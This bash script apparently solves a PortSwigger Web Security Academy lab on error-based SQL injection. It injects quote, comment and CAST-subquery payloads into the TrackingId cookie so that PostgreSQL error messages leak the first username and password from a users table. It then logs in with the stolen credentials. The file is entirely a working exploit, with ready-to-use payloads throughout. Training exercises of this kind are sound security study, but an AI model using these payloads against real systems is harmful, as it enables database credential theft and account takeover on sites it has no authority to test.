#!/bin/bash

LAB_URL="https://0a82006d036be39680e0f3c800bd005b.web-security-academy.net/"

echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
echo "  Visible Error-Based SQL Injection Solver"
echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
echo ""

# ─── Step 1: Get cookies ───────────────────────────────────────────────────────
echo "[*] Fetching cookies..."
RAW_HEADERS=$(curl -sk -D - -o /dev/null "$LAB_URL")
TRACKING_ID=$(echo "$RAW_HEADERS" | grep -i 'TrackingId' | grep -oP 'TrackingId=\K[^;]+' | head -1)
SESSION=$(echo "$RAW_HEADERS" | grep -i 'session=' | grep -oP 'session=\K[^;]+' | head -1)

echo "[+] TrackingId : $TRACKING_ID"
echo "[+] Session    : $SESSION"
echo ""

# Helper: send payload and return response body
send() {
    curl -sk -b "TrackingId=$1; session=$SESSION" "$LAB_URL"
}

# ─── Step 2: Trigger initial error with single quote ──────────────────────────
echo "[*] Step 1 — Triggering SQL error with single quote..."
ERR=$(send "${TRACKING_ID}'")
if echo "$ERR" | grep -qi "error\|unterminated\|syntax"; then
    echo "[+] SQL error triggered ✓"
    echo "$ERR" | grep -oi "ERROR:.*" | head -3
else
    echo "[-] No error — something may be off"
fi
echo ""

# ─── Step 3: Comment out the rest — error should disappear ───────────────────
echo "[*] Step 2 — Commenting out remainder of query..."
RESP=$(send "${TRACKING_ID}'--")
if ! echo "$RESP" | grep -qi "error\|syntax"; then
    echo "[+] Query valid after comment-out ✓"
else
    echo "[-] Still erroring"
fi
echo ""

# ─── Step 4: Confirm CAST trick works ─────────────────────────────────────────
echo "[*] Step 3 — Testing CAST subquery..."
RESP=$(send "${TRACKING_ID}' AND 1=CAST((SELECT 1) AS int)--")
if ! echo "$RESP" | grep -qi "syntax error\|unterminated"; then
    echo "[+] CAST subquery works ✓"
fi
echo ""

# ─── Step 5: Leak username ────────────────────────────────────────────────────
echo "[*] Step 4 — Leaking username from users table..."
RESP=$(send "' AND 1=CAST((SELECT username FROM users LIMIT 1) AS int)--")
USERNAME=$(echo "$RESP" | grep -oP "invalid input syntax for type integer: \"\K[^\"]+")
if [ -n "$USERNAME" ]; then
    echo "[+] First username leaked: $USERNAME"
else
    echo "[!] Raw error output:"
    echo "$RESP" | grep -oi "ERROR:.*" | head -3
fi
echo ""

# ─── Step 6: Leak password ────────────────────────────────────────────────────
echo "[*] Step 5 — Leaking password for $USERNAME..."
RESP=$(send "' AND 1=CAST((SELECT password FROM users LIMIT 1) AS int)--")
PASSWORD=$(echo "$RESP" | grep -oP "invalid input syntax for type integer: \"\K[^\"]+")
if [ -n "$PASSWORD" ]; then
    echo "[+] Password leaked: $PASSWORD"
else
    echo "[!] Raw error output:"
    echo "$RESP" | grep -oi "ERROR:.*" | head -3
fi
echo ""

# ─── Step 7: Login ────────────────────────────────────────────────────────────
echo "[*] Step 6 — Logging in as $USERNAME..."
LOGIN_RESP=$(curl -sk -D - -c /tmp/error_sqli_session.txt \
    -X POST "${LAB_URL}login" \
    -d "username=${USERNAME}&password=${PASSWORD}")

if echo "$LOGIN_RESP" | grep -qi "location.*my-account\|302"; then
    # Follow redirect
    FINAL=$(curl -sk -b /tmp/error_sqli_session.txt "${LAB_URL}my-account")
    if echo "$FINAL" | grep -qi "Log out\|Your username"; then
        echo "[✓] Logged in successfully! Lab solved."
    else
        echo "[!] Login redirect followed but couldn't confirm session"
    fi
else
    echo "[!] Login may have worked — check manually at ${LAB_URL}login"
    echo "    Username: $USERNAME"
    echo "    Password: $PASSWORD"
fi

echo ""
echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
echo "  Done!"
echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
